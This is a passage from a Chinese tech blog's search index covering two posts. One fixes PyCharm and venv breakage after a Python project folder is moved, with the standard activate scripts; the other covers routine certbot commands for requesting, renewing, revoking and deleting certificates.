\u4e2d\u7684\u8def\u5f84\uff0c\u600e\u4e48\u8fd8\u662f\u4f1a\u51fa\u73b0\u8fd9\u4e2a\u95ee\u9898\u5462\u3002 \u53c2\u8003\u4e86 Fatal error in launcher: Unable to create process using \u8fd9\u7bc7\u6587\u7ae0\uff0c\u4e86\u89e3\u5230 pip.exe \u540c\u6837\u4e5f\u4fdd\u5b58\u4e86\u8def\u5f84\uff0c\u800c\u4e14\u5c31\u4fdd\u5b58\u5728 pip.exe \u8fd9\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\u91cc\uff0c\u5982\u679c\u60f3\u8981\u4fee\u6539\u4e5f\u4e0d\u662f\u4e0d\u884c\uff0c\u7528 WinHex \u8fd9\u7c7b\u5de5\u5177\u6539\u5c31\u884c\u3002 \u4f46\u662f\u6211\u4eec\u6ca1\u5fc5\u8981\u8fd9\u4e48\u9ebb\u70e6\uff0c\u6211\u7684\u5efa\u8bae\u662f\u76f4\u63a5\u539f\u5730\u91cd\u88c5 pip \uff0c\u6b65\u9aa4\u5982\u4e0b\uff1a \u9996\u5148\u6709\u4e86\u4e0a\u4e00\u6b65\u7684\u94fa\u57ab\uff0c\u6211\u4eec\u5df2\u7ecf\u80fd\u591f\u8fdb\u5165 venv\uff0c\u90a3\u4e48\u8fdb\u5165 venv I : \\Developer\\web\\blog_mkdocs\\venv\\Scripts\\activate.bat \u7136\u540e\u91cd\u88c5 pip \uff08\u6ce8\u610f\u6b64\u65f6\u4f60\u5df2\u7ecf\u5728 venv \u91cc\u4e86\uff09 python -m pip install --upgrade --force-reinstall pip \u6b64\u65f6\uff0c\u8be5 venv \u91cc\u7684 pip \u5e94\u8be5\u53ef\u4ee5\u6b63\u5e38\u4f7f\u7528\u3002 \u540c\u7406\uff0c\u7ee7\u7eed\u68c0\u67e5 venv/Scripts \u4e0b\u7684\u5176\u4ed6\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4f8b\u5982 mkdocs.exe \uff0c\u8fd9\u4e9b\u90fd\u8981\u901a\u8fc7\u76f8\u540c\u65b9\u5f0f\u91cd\u88c5\u624d\u80fd\u6b63\u5e38\u7528\u3002 pip install --upgrade --force-reinstall mkdocs","title":"\u79fb\u52a8 python \u9879\u76ee\u6587\u4ef6\u5939\u4f4d\u7f6e\u540e\u5982\u4f55\u89e3\u51b3 PyCharm \u627e\u4e0d\u5230\u89e3\u91ca\u5668\u4e0e\u65e0\u6cd5\u6b63\u5e38\u4f7f\u7528\u7ec8\u7aef\u7684\u95ee\u9898"},{"location":"blog/2022/220406-venv-move-file/#_1","text":"\u56e0\u4e3a\u9879\u76ee\u9700\u8981\uff0c\u5c06\u90e8\u5206 python \u9879\u76ee\u79fb\u52a8\u5230\u4e86\u5176\u4ed6\u6587\u4ef6\u5939\uff0c\u5bfc\u81f4\u5728 PyCharm \u4e2d\u627e\u4e0d\u5230\u89e3\u91ca\u5668\uff0c\u4e5f\u65e0\u6cd5\u6b63\u5e38\u4f7f\u7528\u7ec8\u7aef\u3002","title":"\u80cc\u666f"},{"location":"blog/2022/220406-venv-move-file/#_2","text":"\u6211\u4f7f\u7528\u7684 IDE \u662f PyCharm \u4e13\u4e1a\u7248 2021.3.2 \uff0c\u5177\u4f53\u8868\u73b0\u4e3a\u5728 IDE \u5185\u6253\u5f00\u7ec8\u7aef\u540e\uff1a PyCharm \u627e\u4e0d\u5230\u89e3\u91ca\u5668 \u7ec8\u7aef\u5185\u6267\u884c python \u7a0b\u5e8f\u53ea\u80fd\u591f\u4f7f\u7528\u5168\u5c40\u5305 \u65e0\u6cd5\u8fdb\u5165 venv \u73af\u5883\uff08\u5305\u62ec PyCharm \u81ea\u52a8\u8fdb\u5165\u548c\u624b\u52a8\u8fdb\u5165\uff09 \u65e0\u6cd5\u4f7f\u7528 pip","title":"\u73b0\u8c61"},{"location":"blog/2022/220406-venv-move-file/#_3","text":"","title":"\u89e3\u51b3"},{"location":"blog/2022/220406-venv-move-file/#_4","text":"\u8fd9\u4e2a\u95ee\u9898\u597d\u89e3\u51b3\uff0cPyCharm \u4f1a\u81ea\u52a8\u68c0\u6d4b\u5f53\u524d\u76ee\u5f55\u4e0b\u7684 venv \u6587\u4ef6\u5939\uff0c\u5982\u679c\u5b58\u5728\uff0c\u5219\u4f1a\u5c06 venv/Scripts/python \u8bbe\u7f6e\u4e3a\u89e3\u91ca\u5668\u3002\u95ee\u9898\u76f4\u63a5\u89e3\u51b3\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u56e0\u4e3a\u6211\u4eec\u662f\u79fb\u52a8\u4e86 python \u9879\u76ee\u6587\u4ef6\u5939\u7684\uff0c\u56e0\u6b64\u539f\u6765\u7684\u89e3\u91ca\u5668\u8def\u5f84\u8fd8\u4fdd\u7559\u5728 PyCharm \u5185\uff0c\u6240\u4ee5\u9700\u8981\u624b\u52a8\u5c06\u5176\u5220\u9664\u3002\u53ef\u4ee5\u6309\u7167\u4ee5\u4e0b\u6b65\u9aa4\u8fdb\u884c\u64cd\u4f5c\uff1a \u627e\u5230 \u6587\u4ef6 -> \u8bbe\u7f6e -> \u9879\u76ee -> Python \u89e3\u91ca\u5668 \u9009\u62e9\u5f53\u524d\u89e3\u91ca\u5668\u53f3\u8fb9\u7684\u9f7f\u8f6e\u56fe\u6807\uff0c\u70b9\u51fb \u5168\u90e8\u663e\u793a \uff0c\u627e\u5230\u7ea2\u8272\u6807\u8bb0\u7684\u89e3\u91ca\u5668\uff0c\u70b9\u51fb\u5220\u9664\u5373\u53ef\u3002","title":"\u627e\u4e0d\u5230\u89e3\u91ca\u5668"},{"location":"blog/2022/220406-venv-move-file/#venv","text":"\u5177\u4f53\u6709\u4ee5\u4e0b\u51e0\u4e2a\u8868\u73b0\uff1a \u81ea\u5df1\u7684\u5b9e\u9645\u9879\u76ee\u4e2d\u6709\u7b2c\u4e09\u65b9\u5e93\uff08\u4f8b\u5982 aiohttp \uff09\uff0c\u9879\u76ee\u6587\u4ef6\u76f4\u63a5\u53f3\u952e\u8fd0\u884c\u53ef\u4ee5\u6b63\u5e38\u6267\u884c\uff0c\u4f46\u662f\u5728\u7ec8\u7aef\u91cc\u9762\u6267\u884c\u65f6\u4f1a\u62a5\u9519\uff0c\u63d0\u793a ModuleNotFoundError: No module named 'aiohttp' \u3002 \u7ec8\u7aef\u91cc\u76f4\u63a5\u6267\u884c where python \u663e\u793a\u7684\u662f\u5168\u5c40 python \u8def\u5f84\uff0c\u800c\u4e0d\u662f venv \u4e2d\u7684\u8def\u5f84\u3002 \u7ec8\u7aef\u91cc\u76f4\u63a5\u6267\u884c pip list \u4f1a\u63d0\u793a\u53ea\u6709 pip \u548c setuptools \u4e24\u4e2a\u5305\uff0c\u800c\u6211\u4eec\u9879\u76ee\u91cc\u4f9d\u8d56\u7684\u5305\u4e00\u4e2a\u90fd\u6ca1\u6709\u3002 \u539f\u56e0\u5728\u4e8e PyCharm \u81ea\u52a8\u8fdb\u5165 venv \u73af\u5883\u7684\u65f6\u5019\u662f\u4ece venv/Scripts/activate.bat \u8fdb\u5165\u7684\uff0c\u8fd9\u4e2a\u6587\u4ef6\u5b9a\u4e49\u4e86 %PATH% \uff0c\u5f53\u6211\u4eec\u5df2\u7ecf\u79fb\u52a8\u4e86\u9879\u76ee\u6587\u4ef6\u5939\u540e\uff0c activate.bat \u91cc\u8bb0\u5f55\u7684\u8def\u5f84\u5e76\u6ca1\u6709\u6539\uff0c\u800c\u539f\u6765\u7684\u8def\u5f84\u5df2\u7ecf\u4e0d\u5b58\u5728\u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u653e\u5728 venv \u4e0b\u7684 python.exe \u5e76\u4e0d\u4f1a\u81ea\u52a8\u8fdb\u5165\u5230 %PATH% \u4e2d\u3002 \u89e3\u51b3\u65b9\u5f0f\u5f88\u7b80\u5355\uff0c\u76f4\u63a5\u7f16\u8f91 venv/Scripts/activate.bat \u6587\u4ef6\uff0clinux \u540c\u7406\u3002 CMD Bash FishShell Xonsh activate.bat 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 @ echo off set \"VIRTUAL_ENV=I:\\Developer\\web\\blog_mkdocs\\venv\" if defined _OLD_VIRTUAL_PROMPT ( set \"PROMPT= %_OLD_VIRTUAL_PROMPT% \" ) else ( if not defined PROMPT ( set \"PROMPT=$P$G\" ) if not defined VIRTUAL_ENV_DISABLE_PROMPT ( set \"_OLD_VIRTUAL_PROMPT= %PROMPT% \" ) ) if not defined VIRTUAL_ENV_DISABLE_PROMPT ( set \"ENV_PROMPT=\" if NOT DEFINED ENV_PROMPT ( for %% d in ( \" %VIRTUAL_ENV% \" ) do set \"ENV_PROMPT=( %% ~nxd) \" ) ) set \"PROMPT= %ENV_PROMPT%%PROMPT% \" ) REM Don't use () to avoid problems with them in %PATH% if defined _OLD_VIRTUAL_PYTHONHOME goto ENDIFVHOME set \"_OLD_VIRTUAL_PYTHONHOME= %PYTHONHOME% \" : ENDIFVHOME set PYTHONHOME = REM if defined _OLD_VIRTUAL_PATH ( if not defined _OLD_VIRTUAL_PATH goto ENDIFVPATH1 set \"PATH= %_OLD_VIRTUAL_PATH% \" : ENDIFVPATH1 REM ) else ( if defined _OLD_VIRTUAL_PATH goto ENDIFVPATH2 set \"_OLD_VIRTUAL_PATH= %PATH% \" : ENDIFVPATH2 set \"PATH= %VIRTUAL_ENV% \\Scripts; %PATH% \" activate 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 # This file must be used with \"source bin/activate\" *from bash* # you cannot run it directly if [ \" ${ BASH_SOURCE - } \" = \" $0 \" ] ; then echo \"You must source this script: \\$ source $0 \" > & 2 exit 33 fi deactivate () { unset -f pydoc >/dev/null 2 > & 1 || true # reset old environment variables # ! [ -z ${VAR+_} ] returns true if VAR is declared at all if ! [ -z \" ${ _OLD_VIRTUAL_PATH :+_ } \" ] ; then PATH = \" $_OLD_VIRTUAL_PATH \" export PATH unset _OLD_VIRTUAL_PATH fi if ! [ -z \" ${ _OLD_VIRTUAL_PYTHONHOME +_ } \" ] ; then PYTHONHOME = \" $_OLD_VIRTUAL_PYTHONHOME \" export PYTHONHOME unset _OLD_VIRTUAL_PYTHONHOME fi # The hash command must be called to get it to forget past # commands. Without forgetting past commands the $PATH changes # we made may not be respected hash -r 2 >/dev/null if ! [ -z \" ${ _OLD_VIRTUAL_PS1 +_ } \" ] ; then PS1 = \" $_OLD_VIRTUAL_PS1 \" export PS1 unset _OLD_VIRTUAL_PS1 fi unset VIRTUAL_ENV if [ ! \" ${ 1 - } \" = \"nondestructive\" ] ; then # Self destruct! unset -f deactivate fi } # unset irrelevant variables deactivate nondestructive VIRTUAL_ENV = 'I:\\Developer\\web\\blog_mkdocs\\venv' if ([ \" $OSTYPE \" = \"cygwin\" ] || [ \" $OSTYPE \" = \"msys\" ]) && $( command -v cygpath & > /dev/null ) ; then VIRTUAL_ENV = $( cygpath -u \" $VIRTUAL_ENV \" ) fi export VIRTUAL_ENV _OLD_VIRTUAL_PATH = \" $PATH \" PATH = \" $VIRTUAL_ENV /Scripts: $PATH \" export PATH # unset PYTHONHOME if set if ! [ -z \" ${ PYTHONHOME +_ } \" ] ; then _OLD_VIRTUAL_PYTHONHOME = \" $PYTHONHOME \" unset PYTHONHOME fi if [ -z \" ${ VIRTUAL_ENV_DISABLE_PROMPT - } \" ] ; then _OLD_VIRTUAL_PS1 = \" ${ PS1 - } \" if [ \"x\" ! = x ] ; then PS1 = \" ${ PS1 - } \" else PS1 = \"(`basename \\\" $VIRTUAL_ENV \\\"`) ${ PS1 - } \" fi export PS1 fi # Make sure to unalias pydoc if it's already there alias pydoc 2 >/dev/null >/dev/null && unalias pydoc || true pydoc () { python -m pydoc \" $@ \" } # The hash command must be called to get it to forget past # commands. Without forgetting past commands the $PATH changes # we made may not be respected hash -r 2 >/dev/null activate.fish 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 # This file must be used using `source bin/activate.fish` *within a running fish ( http://fishshell.com ) session*. # Do not run it directly. function _bashify_path -d \"Converts a fish path to something bash can recognize\" set fishy_path $argv set bashy_path $fishy_path [ 1 ] for path_part in $fishy_path [ 2..-1 ] set bashy_path \" $bashy_path : $path_part \" end echo $bashy_path end function _fishify_path -d \"Converts a bash path to something fish can recognize\" echo $argv | tr ':' '\\n' end function deactivate -d 'Exit virtualenv mode and return to the normal environment.' # reset old environment variables if test -n \" $_OLD_VIRTUAL_PATH \" # https://github.com/fish-shell/fish-shell/issues/436 altered PATH handling if test ( echo $FISH_VERSION | head -c 1 ) -lt 3 set -gx PATH ( _fishify_path \" $_OLD_VIRTUAL_PATH \" ) else set -gx PATH \" $_OLD_VIRTUAL_PATH \" end set -e _OLD_VIRTUAL_PATH end if test -n \" $_OLD_VIRTUAL_PYTHONHOME \" set -gx PYTHONHOME \" $_OLD_VIRTUAL_PYTHONHOME \" set -e _OLD_VIRTUAL_PYTHONHOME end if test -n \" $_OLD_FISH_PROMPT_OVERRIDE \" and functions -q _old_fish_prompt # Set an empty local `$fish_function_path` to allow the removal of `fish_prompt` using `functions -e`. set -l fish_function_path # Erase virtualenv's `fish_prompt` and restore the original. functions -e fish_prompt functions -c _old_fish_prompt fish_prompt functions -e _old_fish_prompt set -e _OLD_FISH_PROMPT_OVERRIDE end set -e VIRTUAL_ENV if test \" $argv [1]\" ! = 'nondestructive' # Self-destruct! functions -e pydoc functions -e deactivate functions -e _bashify_path functions -e _fishify_path end end # Unset irrelevant variables. deactivate nondestructive set -gx VIRTUAL_ENV 'I:\\Developer\\web\\blog_mkdocs\\venv' # https://github.com/fish-shell/fish-shell/issues/436 altered PATH handling if test ( echo $FISH_VERSION | head -c 1 ) -lt 3 set -gx _OLD_VIRTUAL_PATH ( _bashify_path $PATH ) else set -gx _OLD_VIRTUAL_PATH \" $PATH \" end set -gx PATH \" $VIRTUAL_ENV \" '/Scripts' $PATH # Unset `$PYTHONHOME` if set. if set -q PYTHONHOME set -gx _OLD_VIRTUAL_PYTHONHOME $PYTHONHOME set -e PYTHONHOME end function pydoc python -m pydoc $argv end if test -z \" $VIRTUAL_ENV_DISABLE_PROMPT \" # Copy the current `fish_prompt` function as `_old_fish_prompt`. functions -c fish_prompt _old_fish_prompt function fish_prompt # Run the user's prompt first; it might depend on (pipe)status. set -l prompt ( _old_fish_prompt ) # Prompt override provided? # If not, just prepend the environment name. if test -n '' printf '%s%s' '' ( set_color normal ) else printf '%s(%s) ' ( set_color normal ) ( basename \" $VIRTUAL_ENV \" ) end string join -- \\n $prompt # handle multi-line prompts end set -gx _OLD_FISH_PROMPT_OVERRIDE \" $VIRTUAL_ENV \" end activate.xsh 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 \"\"\"Xonsh activate script for virtualenv\"\"\" from xonsh.tools import get_sep as _get_sep def _deactivate(args): if \"pydoc\" in aliases: del aliases[\"pydoc\"] if ${...}.get(\"_OLD_VIRTUAL_PATH\", \"\"): $PATH = $_OLD_VIRTUAL_PATH del $_OLD_VIRTUAL_PATH if ${...}.get(\"_OLD_VIRTUAL_PYTHONHOME\", \"\"): $PYTHONHOME = $_OLD_VIRTUAL_PYTHONHOME del $_OLD_VIRTUAL_PYTHONHOME if \"VIRTUAL_ENV\" in ${...}: del $VIRTUAL_ENV if \"VIRTUAL_ENV_PROMPT\" in ${...}: del $VIRTUAL_ENV_PROMPT if \"nondestructive\" not in args: # Self destruct! del aliases[\"deactivate\"] # unset irrelevant variables _deactivate([\"nondestructive\"]) aliases[\"deactivate\"] = _deactivate $VIRTUAL_ENV = r\"I:\\Developer\\web\\blog_mkdocs\\venv\" $_OLD_VIRTUAL_PATH = $PATH $PATH = $PATH[:] $PATH.add($VIRTUAL_ENV + _get_sep() + \"Scripts\", front=True, replace=True) if ${...}.get(\"PYTHONHOME\", \"\"): # unset PYTHONHOME if set $_OLD_VIRTUAL_PYTHONHOME = $PYTHONHOME del $PYTHONHOME $VIRTUAL_ENV_PROMPT = \"\" if not $VIRTUAL_ENV_PROMPT: del $VIRTUAL_ENV_PROMPT aliases[\"pydoc\"] = [\"python\", \"-m\", \"pydoc\"]","title":"\u7ec8\u7aef\u53ea\u80fd\u591f\u4f7f\u7528\u5168\u5c40\u5305\u4e0e\u65e0\u6cd5\u8fdb\u5165 venv \u73af\u5883"},{"location":"blog/2022/220406-venv-move-file/#pip","text":"\u901a\u8fc7\u4fee\u6539 activate.bat \u4f7f\u5f97\u80fd\u6b63\u5e38\u8fdb\u5165 venv \u73af\u5883\u540e\uff0c\u4f1a\u8fce\u6765\u7b2c\u4e09\u4e2a\u95ee\u9898\uff0c\u5c31\u662f\u65e0\u6cd5\u4f7f\u7528 pip \u5b89\u88c5\u5305\u3002 \u5177\u4f53\u8868\u73b0\u4e3a\uff0c\u4f7f\u7528 pip \u547d\u4ee4\u540e\uff0c\u7ec8\u7aef\u4f1a\u62a5\u9519\uff1a Fatal error in launcher: unable to create process using: 'XXXXXXX/python.exe' 'XXXXXXXXX/pip.exe' \u3002 \u6211\u4e00\u770b\uff0c\u8fd9\u4e2a\u6240\u8c13\u7684 'XXXXXXX/python.exe' \u6b63\u662f\u6211\u4eec\u5728\u79fb\u52a8\u9879\u76ee\u6587\u4ef6\u4e4b\u524d\u7684 venv \u7684 python \u8def\u5f84\uff0c\u53ef\u662f\u6211\u4eec\u5df2\u7ecf\u4fee\u6539\u4e86 activate.bat \u4e2d\u7684\u8def\u5f84\uff0c\u600e\u4e48\u8fd8\u662f\u4f1a\u51fa\u73b0\u8fd9\u4e2a\u95ee\u9898\u5462\u3002 \u53c2\u8003\u4e86 Fatal error in launcher: Unable to create process using \u8fd9\u7bc7\u6587\u7ae0\uff0c\u4e86\u89e3\u5230 pip.exe \u540c\u6837\u4e5f\u4fdd\u5b58\u4e86\u8def\u5f84\uff0c\u800c\u4e14\u5c31\u4fdd\u5b58\u5728 pip.exe \u8fd9\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\u91cc\uff0c\u5982\u679c\u60f3\u8981\u4fee\u6539\u4e5f\u4e0d\u662f\u4e0d\u884c\uff0c\u7528 WinHex \u8fd9\u7c7b\u5de5\u5177\u6539\u5c31\u884c\u3002 \u4f46\u662f\u6211\u4eec\u6ca1\u5fc5\u8981\u8fd9\u4e48\u9ebb\u70e6\uff0c\u6211\u7684\u5efa\u8bae\u662f\u76f4\u63a5\u539f\u5730\u91cd\u88c5 pip \uff0c\u6b65\u9aa4\u5982\u4e0b\uff1a \u9996\u5148\u6709\u4e86\u4e0a\u4e00\u6b65\u7684\u94fa\u57ab\uff0c\u6211\u4eec\u5df2\u7ecf\u80fd\u591f\u8fdb\u5165 venv\uff0c\u90a3\u4e48\u8fdb\u5165 venv I : \\Developer\\web\\blog_mkdocs\\venv\\Scripts\\activate.bat \u7136\u540e\u91cd\u88c5 pip \uff08\u6ce8\u610f\u6b64\u65f6\u4f60\u5df2\u7ecf\u5728 venv \u91cc\u4e86\uff09 python -m pip install --upgrade --force-reinstall pip \u6b64\u65f6\uff0c\u8be5 venv \u91cc\u7684 pip \u5e94\u8be5\u53ef\u4ee5\u6b63\u5e38\u4f7f\u7528\u3002 \u540c\u7406\uff0c\u7ee7\u7eed\u68c0\u67e5 venv/Scripts \u4e0b\u7684\u5176\u4ed6\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4f8b\u5982 mkdocs.exe \uff0c\u8fd9\u4e9b\u90fd\u8981\u901a\u8fc7\u76f8\u540c\u65b9\u5f0f\u91cd\u88c5\u624d\u80fd\u6b63\u5e38\u7528\u3002 pip install --upgrade --force-reinstall mkdocs","title":"\u65e0\u6cd5\u4f7f\u7528 pip"},{"location":"blog/2022/220407-certbot/","tags":["ssl","letsencrypt","certbot"],"text":"\u5b89\u88c5 \u00b6 \u5b98\u7f51\u5efa\u8bae\u7528 snap \u5b89\u88c5\u3002\ud83d\udc49 https://certbot.eff.org/instructions?ws=other&os=ubuntufocal sudo snap install core sudo snap refresh core sudo snap install --classic certbot \u7533\u8bf7\u591a\u4e2a\u57df\u540d\u8bc1\u4e66 \u00b6 \u8b66\u544a \u65e0\u8bba\u4f60\u9700\u8981\u7533\u8bf7\u591a\u5c11\u4e2a\u8bc1\u4e66\uff0c\u5728\u7533\u8bf7\u4e4b\u524d\uff0c\u90fd\u8bf7\u5728\u4f60\u7684 DNS \u63d0\u4f9b\u5546\u5904\u5c06\u4f60\u6240\u9700\u8981\u7533\u8bf7 SSL \u8bc1\u4e66\u7684\u57df\u540d\u89e3\u6790\u5230\u4f60\u7684\u670d\u52a1\u5668\u4e0a\u3002 \u63d0\u793a \u6839\u636e\u4f60\u7684 80 \u7aef\u53e3\u6709\u6ca1\u6709\u88ab\u5360\u7528\uff0c\u4f60\u9700\u8981\u4f7f\u7528\u4e24\u79cd\u6a21\u5f0f\u2014\u2014 nginx \u6216\u8005 standalone \u3002 \u4f60\u7684 80 \u7aef\u53e3\u5df2\u7ecf\u88ab nginx \uff08\u6216\u8005\u5176\u4ed6\u670d\u52a1\uff09\u5360\u7528\u4e86\uff1a certbot certonly --nginx -d example.com -d www.example.com -d another.example.com \u4f60\u7684 80 \u7aef\u53e3\u6ca1\u6709\u88ab\u4efb\u4f55\u670d\u52a1\u5360\u7528\uff1a certbot certonly --standalone -d example.com -d www.example.com -d another.example.com \u7533\u8bf7\u6cdb\u57df\u540d\u8bc1\u4e66\uff08\u4e5f\u53eb\u901a\u914d\u7b26\u8bc1\u4e66\uff09 \u00b6 \u6bd4\u8f83\u9ebb\u70e6\uff0c\u9700\u8981\u5728 DNS \u670d\u52a1\u63d0\u4f9b\u5546\u5904\u8bbe\u7f6e TXT \u8bb0\u5f55\u3002\u5e76\u4e14 \u53ea\u80fd \u901a\u8fc7\u8fd9\u4e2a\u65b9\u5f0f\u6765\u7eed\u671f\u3002 certbot certonly -d \"*.example.com\" -d \"example.com\" --manual --preferred-challenges dns --server https://acme-v02.api.letsencrypt.org/directory \u5176\u4e2d --server \u53c2\u6570\u6240\u6307\u5411\u7684 url \u4e5f\u8bb8\u4f1a\u53d8\u5316\uff0c\u4f46\u662f\u4f60\u603b\u80fd\u5728 Let's Encrypt \u7684 \u6587\u6863 \u4e0a\u627e\u5230\u6700\u65b0\u7684\u3002 \u6267\u884c\u4e4b\u540e\u4f1a\u4ea4\u7ed9\u4f60\u4e00\u4e2a\u6216\u4e24\u4e2a\u8bbe\u7f6e TXT \u8bb0\u5f55\u7684\u4efb\u52a1\u3002\u53bb\u4f60\u7684 DNS \u670d\u52a1\u63d0\u4f9b\u5546\u5904\u8bbe\u7f6e\u597d\u5373\u53ef\u3002 \u67e5\u770b\u81ea\u52a8\u7eed\u671f\u7684\u8ba1\u5212\u4efb\u52a1 \u00b6 systemctl list-timers \u624b\u52a8\u4e3a\u8bc1\u4e66\u7eed\u671f \u00b6 \u4e0d\u52a0\u4efb\u4f55\u53c2\u6570\uff0c\u6ca1\u6709\u4e34\u8fd1\u5230\u671f\u65f6\u95f4\u7684\u8bdd\u4f1a\u505c\u6b62\u6267\u884c certbot renew \u6d4b\u8bd5\u7eed\u671f\uff0c\u4e0d\u4f1a\u771f\u7684\u7eed\u671f certbot renew --dry-run \u5f3a\u5236\u7eed\u671f certbot renew --force-renewal \u4e3a\u8bc1\u4e66\u7eed\u671f\uff08\u6cdb\u57df\u540d\uff09 \u00b6 \u6cdb\u57df\u540d\u8bc1\u4e66\u4e0d\u80fd\u901a\u8fc7 certbot renew \u6765\u7eed\u671f\uff0c\u9700\u8981\u624b\u52a8\u7eed\u671f\u3002\u5426\u5219\u4f1a\u62a5\u9519\u3002 \u539f\u56e0\u5f88\u7b80\u5355\uff0c\u5c31\u662f\u4f60\u5728\u7533\u8bf7\u6cdb\u57df\u540d\u8bc1\u4e66\u7684\u65f6\u5019\u5728 DNS \u670d\u52a1\u5546\u90a3\u91cc\u6dfb\u52a0\u7684 TXT \u8bb0\u5f55\uff0c\u8fd9\u662f\u4e00\u4e2a\u4f1a\u53d8\u5316\u7684\u503c\u3002 \u7eed\u671f\u65b9\u6cd5\u548c\u7533\u8bf7\u65b9\u6cd5\u4e00\u6a21\u4e00\u6837\uff0c\u76f8\u5f53\u4e8e\u91cd\u65b0\u7533\u8bf7\u4e00\u6b21\u3002 certbot certonly -d \"*.example.com\" -d \"example.com\" --manual --preferred-challenges dns --server https://acme-v02.api.letsencrypt.org/directory \u4e2d\u9014\u540c\u6837\u9700\u8981\u4fee\u6539 DNS \u7684 TXT \u8bb0\u5f55\u8fd9\u6837\u7684\u64cd\u4f5c\u3002\u6709\u4eba\u53ef\u80fd\u4f1a\u89c9\u5f97\u5f88\u9ebb\u70e6\uff0c\u9ebb\u70e6\u4f60\u5c31\u53bb\u5199\u4e2a\u811a\u672c\u554a\u3002 \u4e8b\u5b9e\u4e0a certbot \u7684\u62a5\u9519\u4e5f\u8bf4\u5f97\u5f88\u6e05\u695a\u4e86\uff0c\u4ed6\u7684\u610f\u601d\u5c31\u662f\u8981\u6211\u4eec\u53bb\u5199\u4e2a\u811a\u672c\uff1a An authentication script must be provided with --manual-auth-hook when using the manual plugin non-interactively. \u7f51\u4e0a\u6709\u5404\u4e2a\u7248\u672c\u7684\u811a\u672c\uff0c\u5927\u6982\u539f\u7406\u90fd\u662f\u901a\u8fc7\u4f60 DNS \u670d\u52a1\u5546\u63d0\u4f9b\u7684 Token\uff0c\u5728\u670d\u52a1\u5668\u4e0a\u76f4\u63a5\u4fee\u6539 DNS \u7684 TXT \u8bb0\u5f55\u3002\u4e00\u641c\u4e00\u5927\u5806\u3002 \u540a\u9500\uff08\u64a4\u9500\uff09\u8bc1\u4e66 \u00b6 \u8fd9\u91cc\u76f4\u63a5\u5f15\u7528 Let's Encrypt \u5b98\u7f51 \u7528\u9881\u53d1\u8bc1\u4e66\u7684\u8d26\u6237\u540a\u9500\u8bc1\u4e66 certbot revoke --cert-path /etc/letsencrypt/archive/ ${ YOUR_DOMAIN } /cert1.pem \u4f7f\u7528\u8bc1\u4e66\u79c1\u94a5\u540a\u9500\u8bc1\u4e66 certbot revoke --cert-path /PATH/TO/cert.pem --key-path /PATH/TO/key.pem \u4f7f\u7528\u5176\u4ed6\u6388\u6743\u5e10\u6237\u540a\u9500\u8bc1\u4e66 \u5148\u4ece crt.sh \u4e2d\u4e0b\u8f7d\u8bc1\u4e66\uff0c\u7136\u540e\uff1a certbot revoke --cert-path /PATH/TO/downloaded-cert.pem \u5220\u9664\u8bc1\u4e66 \u00b6 certbot delete","title":"certbot \u5e38\u7528\u64cd\u4f5c"},{"location":"blog/2022/220407-certbot/#_1","text":"\u5b98\u7f51\u5efa\u8bae\u7528 snap \u5b89\u88c5\u3002\ud83d\udc49 https://certbot.eff.org/instructions?ws=other&os=ubuntufocal sudo snap install core sudo snap refresh core sudo snap install --classic certbot","title":"\u5b89\u88c5"},{"location":"blog/2022/220407-certbot/#_2","text":"\u8b66\u544a \u65e0\u8bba\u4f60\u9700\u8981\u7533\u8bf7\u591a\u5c11\u4e2a\u8bc1\u4e66\uff0c\u5728\u7533\u8bf7\u4e4b\u524d\uff0c\u90fd\u8bf7\u5728\u4f60\u7684 DNS \u63d0\u4f9b\u5546\u5904\u5c06\u4f60\u6240\u9700\u8981\u7533\u8bf7 SSL \u8bc1\u4e66\u7684\u57df\u540d\u89e3\u6790\u5230\u4f60\u7684\u670d\u52a1\u5668\u4e0a\u3002 \u63d0\u793a \u6839\u636e\u4f60\u7684 80 \u7aef\u53e3\u6709\u6ca1\u6709\u88ab\u5360\u7528\uff0c\u4f60\u9700\u8981\u4f7f\u7528\u4e24\u79cd\u6a21\u5f0f\u2014\u2014 nginx \u6216\u8005 standalone \u3002 \u4f60\u7684 80 \u7aef\u53e3\u5df2\u7ecf\u88ab nginx \uff08\u6216\u8005\u5176\u4ed6\u670d\u52a1\uff09\u5360\u7528\u4e86\uff1a certbot certonly --nginx -d example.com -d www.example.com -d another.example.com \u4f60\u7684 80 \u7aef\u53e3\u6ca1\u6709\u88ab\u4efb\u4f55\u670d\u52a1\u5360\u7528\uff1a certbot certonly --standalone -d example.com -d www.example.com -d another.example.com","title":"\u7533\u8bf7\u591a\u4e2a\u57df\u540d\u8bc1\u4e66"},{"location":"blog/2022/220407-certbot/#_3","text":"\u6bd4\u8f83\u9ebb\u70e6\uff0c\u9700\u8981\u5728 DNS \u670d\u52a1\u63d0\u4f9b\u5546\u5904\u8bbe\u7f6e TXT \u8bb0\u5f55\u3002\u5e76\u4e14 \u53ea\u80fd \u901a\u8fc7\u8fd9\u4e2a\u65b9\u5f0f\u6765\u7eed\u671f\u3002 certbot certonly -d \"*.example.com\" -d \"example.com\" --manual --preferred-challenges dns --server https://acme-v02.api.letsencrypt.org/directory \u5176\u4e2d --server \u53c2\u6570\u6240\u6307\u5411\u7684 url 